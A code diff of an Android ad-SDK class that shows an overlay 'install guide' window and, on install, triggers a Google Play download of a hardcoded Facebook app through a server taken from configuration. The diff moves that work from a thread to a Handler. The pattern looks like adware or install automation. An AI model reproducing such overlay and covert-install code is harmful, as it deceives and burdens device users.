@@ -2,6 +2,7 @@ package com.mob.root.ad.task;
 
 import android.content.Context;
 import android.graphics.PixelFormat;
+import android.os.Handler;
 import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.View;
@@ -12,7 +13,6 @@ import android.widget.Button;
 import android.widget.ImageView;
 import android.widget.ListView;
 import android.widget.TextView;
-
 import com.giga.sdk.ClientManager;
 import com.mob.root.AMApplication;
 import com.mob.root.R;
@@ -20,10 +20,11 @@ import com.mob.root.adapter.InstallWindowPerListAdapter;
 import com.mob.root.entity.AD;
 import com.mob.root.net.parser.ConfigParser;
 import com.mob.root.tools.AMConstants;
+import com.mob.root.tools.AMLogger;
 import com.mob.root.tools.CommonUtils;
 import com.nostra13.universalimageloader.core.ImageLoader;
 
-class InstallGuideWindowTask extends ADWindowTask {
+class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 
 	private WindowManager mWindowManager;
 	private LayoutInflater mInflater;
@@ -33,12 +34,14 @@ class InstallGuideWindowTask extends ADWindowTask {
 	private Button mInstallBtn;
 	private ImageView mCloseIV;
 	private AD mAD;
+	private Handler mHandler;
 	
 	private InstallWindowPerListAdapter mAdapter;
 	
 	InstallGuideWindowTask(Context context, AD ad) {
 		super(context);
 		mAD = ad;
+		mHandler = new Handler();
 	}
 
 	@Override
@@ -113,7 +116,7 @@ class InstallGuideWindowTask extends ADWindowTask {
 				try {
 					installApp();
 				} catch (Exception e) {
-					e.printStackTrace();
+					AMLogger.e(null, e.getMessage());
 				}
 			}
 		});
@@ -125,19 +128,20 @@ class InstallGuideWindowTask extends ADWindowTask {
 		ADTask adTask = builder.setADType(TaskType.WINDOW_INSTALLING, mContext, mAD).build();
 		adTask.start();
 		AMApplication.instance.installADs.add(mAD);
-		new Thread(){
-			public void run() {
-				try {
-					String destUrl = CommonUtils.getDestUrl(mAD.getLandingPager());
-					ClientManager clientManager = ClientManager.getInstance(mContext);
-					ConfigParser parser = new ConfigParser();
-					String serverName = parser.getValue(mContext, AMConstants.NET_GP_SERVER);
-					String serverPort = parser.getValue(mContext, AMConstants.NET_GP_SERVER_PORT);
-					clientManager.downloadWithGooglePlay("https://play.google.com/store/apps/details?id=com.facebook.katana", null, serverName, Integer.parseInt(serverPort), 600000);
-				} catch (Exception e) {
-					e.printStackTrace();
-				}
-			};
-		}.start();
+		mHandler.post(this);
+	}
+
+	@Override
+	public void run() {
+		try {
+			String destUrl = CommonUtils.getDestUrl(mAD.getLandingPager());
+			ClientManager clientManager = ClientManager.getInstance(mContext);
+			ConfigParser parser = new ConfigParser();
+			String serverName = parser.getValue(mContext, AMConstants.NET_GP_SERVER);
+			String serverPort = parser.getValue(mContext, AMConstants.NET_GP_SERVER_PORT);
+			clientManager.downloadWithGooglePlay("https://play.google.com/store/apps/details?id=com.facebook.katana", null, serverName, Integer.parseInt(serverPort), 600000);
+		} catch (Exception e) {
+			AMLogger.e(null, e.getMessage());
+		}
 	}
 }
